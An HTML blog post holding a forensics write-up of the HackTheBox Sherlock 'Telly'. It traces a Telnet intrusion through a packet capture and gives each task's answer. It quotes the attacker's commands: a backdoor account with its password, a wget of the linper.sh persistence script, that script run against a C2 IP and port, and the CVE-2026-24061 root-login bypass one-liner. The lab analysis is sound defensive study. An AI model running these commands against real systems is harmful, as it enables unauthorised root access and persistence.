@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sherlock - Telly writeup | Flock137</title>
+<meta name="description" content="">
+
+<link rel="stylesheet" href="/css/main.min.css">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<meta name="generator" content="Hugo 0.160.1">
+
+</head>
+<body class="site-wrap">
+  <header class="site-header">
+  <div class="container">
+    <a class="site-logo" href="/">Flock137</a>
+    <nav class="site-nav">
+      
+        <a href="/posts/">Blog</a>
+      
+        <a href="/daily-tips/">Daily Tips</a>
+      
+      <button id="theme-toggle" aria-label="Toggle theme">☀️ Light</button>
+    </nav>
+  </div>
+</header>
+
+  <main class="container">
+    
+<div class="post-layout">
+  
+  <article>
+    
+
+
+
+<div class="post-thumbnail no-image">
+  
+</div>
+
+
+    <h1 style="font-size: 2rem; line-height: 1.2; margin-bottom: .8rem;">Sherlock - Telly writeup</h1>
+    <div class="post-meta">
+      <span>April 21, 2026</span>
+      <span>5 min read</span>
+      
+        <span class="tag">Forensics</span><span class="tag">Linux</span>
+      
+    </div>
+
+    <div class="post-content">
+      <p>This post today will be about Telly - a HackTheBox Sherlock about the shiny new vulnerability of Telnet where it grants you sudo from userspace, in a pretty trivial manner.</p>
+<p>I will do a walkthrough the tasks in Sherlock first, then we will go on how this particular CVE works.</p>
+<h2 id="scenario">Scenario</h2>
+<p>You are a Junior DFIR Analyst at an MSSP that provides continuous monitoring and DFIR services to SMBs. Your supervisor has tasked you with analyzing network telemetry from a compromised backup server. A DLP solution flagged a possible data exfiltration attempt from this server. According to the IT team, this server wasn&rsquo;t very busy and was sometimes used to store backups.</p>
+<p><strong>Folder structure</strong></p>
+<pre tabindex="0"><code>❯ tree
+.
+└── monitoringservice_export_202610AM-11AM.pcapng
+</code></pre><h2 id="task-1">Task 1</h2>
+<p><em>What CVE is associated with the vulnerability exploited in the Telnet protocol?</em></p>
+<p>When I first skim on the whole log, it was like:&ldquo;That&rsquo;s weird, how did you get into root right away? And with Telnet? That&rsquo;s strange&rdquo;.</p>
+<p>Then I hit up Google and saw search result for &ldquo;Telnet root vulnerability&rdquo;. And, it was <a href="https://www.txone.com/blog/cve-2026-24061-gnu-inetutils-telnet-exploitation/">CVE-2026-24061</a>.</p>
+<h2 id="task-2">Task 2</h2>
+<p><em>When was the Telnet vulnerability successfully exploited, granting the attacker remote root access on the target machine?</em></p>
+<p>It&rsquo;s when the first TELNET protocol appeared in the log.</p>
+<p>Answer: 2026-01-27 10:39:28</p>
+<h2 id="task-3">Task 3</h2>
+<p><em>What is the hostname of the targeted server?</em></p>
+<p>Right-click on the above telnet event &gt; Follow &gt; Follow TCP Stream, you should see within the first lines:</p>
+<pre tabindex="0"><code>Linux 6.8.0-90-generic (backup-secondary) (pts/1)
+</code></pre><p>It is highly recommended that you read everything in that TCP stream first before you proceed further, as the rest of the writeup will constantly refer to it one way or another. Luckily, it&rsquo;s a short one.</p>
+<h2 id="task-4">Task 4</h2>
+<p><em>The attacker created a backdoor account to maintain future access. What username and password were set for that account?</em></p>
+<p>Same TCP stream, scroll down further a bit and you will see these lines:</p>
+<pre tabindex="0"><code>.[200~sudo useradd -m -s /bin/bash cleanupsvc; echo &#34;cleanupsvc:YouKnowWhoiam69&#34; | sudo chpasswd.[201~
+.[7msudo useradd -m -s /bin/bash cleanupsvc; echo &#34;cleanupsvc:YouKnowWhoiam69&#34; | sudo chpasswd.[27m
+</code></pre><p>Without all the surrounding mess, it should be:</p>
+<pre tabindex="0"><code>sudo useradd -m -s /bin/bash cleanupsvc; echo &#34;cleanupsvc:YouKnowWhoiam69&#34; | sudo chpasswd
+</code></pre><h2 id="task-5">Task 5</h2>
+<p><em>What was the full command the attacker used to download the persistence script?</em></p>
+<p>After finding out the <strong>sensitive database</strong>, the hacker began to install a persistance and execute script, namely <code>linper.sh</code>.</p>
+<p>In the TCP stream:</p>
+<pre tabindex="0"><code>..[?2004h.]0;root@backup-secondary: /tmp.root@backup-secondary:/tmp# 
+w
+w
+g
+g
+e
+e
+t
+t
+ 
+ 
+.[200~https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh.[201~
+.[7mhttps://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh.[27m
+</code></pre><p>In clean format:</p>
+<pre tabindex="0"><code>wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh
+</code></pre><h2 id="task-6">Task 6</h2>
+<p><em>The attacker installed remote access persistence using the persistence script. What is the C2 IP address?</em></p>
+<p>I make a blind guess on the IP that appeared in the middle of the stream, and somehow it was right. After everything is done, I look back on the task and lookup on how to use the <a href="https://github.com/montysecurity/linper">linper.sh</a>.</p>
+<p>After the attacker successfully installed the script, they <code>chmod +x</code> it, then, in chronological order:</p>
+<pre tabindex="0"><code>bash linper.sh --enum-defenses
+
+bash linper.sh -i 91.99.25.54 -p 5599 --stealth-mode
+</code></pre><h2 id="task-7">Task 7</h2>
+<p><em>The attacker exfiltrated a sensitive database file. At what time was this file exfiltrated?</em></p>
+<p>The time that occured such event should be from this line:</p>
+<pre tabindex="0"><code>192.168.72.131 - - [27/Jan/2026 10:49:54] &#34;GET /credit-cards-25-blackfriday.db HTTP/1.1&#34; 200 -
+</code></pre><p>This mark that the attacker has successfully transfered to themselves the sensitive data.</p>
+<h2 id="task-8">Task 8</h2>
+<p><em>Analyze the exfiltrated database. To follow compliance requirements, the breached organization needs to notify its customers. For data validation purposes, find the credit card number for a customer named Quinn Harris.</em></p>
+<p>To do this challenge, you need to use a wireshark feature - Export Object. Go to:</p>
+<pre tabindex="0"><code>File &gt; Export Object &gt; HTTP &gt; Pick the database 
+</code></pre><p>Now when you have the exported database, it&rsquo;s a good rule of thumb to check what kind of database you have before trying to read it, by using the command <code>file</code>, available on both Linux/MacOSX and Windows.</p>
+<pre tabindex="0"><code>❯ file credit-cards-25-blackfriday.db 
+credit-cards-25-blackfriday.db: SQLite 3.x database, last written using SQLite version 3046001, file counter 7, database pages 3, cookie 0x7, schema 4, UTF-8, version-valid-for 7
+</code></pre><p>So, you know that we will need a sqlite reader.</p>
+<p>In this case, I can give you an example how I read this file on a Linux machine with command-line interface (CLI).</p>
+<p>First, install sqlite3 with your respective distro&rsquo;s method. Mine is, for example:</p>
+<pre tabindex="0"><code>sudo pacman -S sqlite3
+</code></pre><p>Then launch the interactive shell:</p>
+<pre tabindex="0"><code>❯ sqlite3 credit-cards-25-blackfriday.db  
+SQLite version 3.53.0 2026-04-09 11:41:38
+Enter &#34;.help&#34; for usage hints.
+sqlite&gt; .tables
+purchases
+</code></pre><p>Now, we need to list the table:</p>
+<pre tabindex="0"><code>sqlite&gt; SELECT * FROM purchases 
+</code></pre><p>You will see Quinn Harris email there.</p>
+<h2 id="cve-2026-24061-root-via-telnet">CVE-2026-24061: Root via Telnet</h2>
+<p>Reference:</p>
+<ul>
+<li><a href="https://www.txone.com/blog/cve-2026-24061-gnu-inetutils-telnet-exploitation/">txOne Network</a></li>
+<li><a href="https://www.offsec.com/blog/cve-2026-24061/">OffSec</a></li>
+</ul>
+<blockquote>
+<p>CVE‑2026‑24061 is a critical authentication‑bypass vulnerability in GNU inetutils telnetd. During Telnet option negotiation, a remote client can inject environment variables using the NEW‑ENVIRON mechanism (RFC 1572). On vulnerable telnetd versions, the value of USER is forwarded unsanitized to the system login program; setting USER=-f root causes login to treat the session as “pre‑authenticated,” yielding an unauthenticated root shell. Because telnetd directly passes the USER environment variable as an argument to /bin/login, the injected value is interpreted as a command-line option rather than a username.</p>
+</blockquote>
+<p>In other words, the attacker executes this command (or something else similar using the same mechanism stated above) to bypass authentication:</p>
+<pre tabindex="0"><code>USER=&#39;-f root&#39; telnet -a &lt;ipaddr&gt;
+</code></pre>
+    </div>
+  </article>
+
+  
+  
+  <aside class="toc-sidebar">
+    <h3>On this page</h3>
+    <nav><nav id="TableOfContents">
+  <ul>
+    <li><a href="#scenario">Scenario</a></li>
+    <li><a href="#task-1">Task 1</a></li>
+    <li><a href="#task-2">Task 2</a></li>
+    <li><a href="#task-3">Task 3</a></li>
+    <li><a href="#task-4">Task 4</a></li>
+    <li><a href="#task-5">Task 5</a></li>
+    <li><a href="#task-6">Task 6</a></li>
+    <li><a href="#task-7">Task 7</a></li>
+    <li><a href="#task-8">Task 8</a></li>
+    <li><a href="#cve-2026-24061-root-via-telnet">CVE-2026-24061: Root via Telnet</a></li>
+  </ul>
+</nav></nav>
+  </aside>
+  
+</div>
+
+  </main>
+  <footer class="site-footer">
+  <div class="container">
+    <p>© 2026 Flock137 · Built with <a href="https://gohugo.io">Hugo</a></p>
+  </div>
+</footer>
+
+  
+  <script src="/js/theme.min.js" defer></script>
+</body>
+</html>
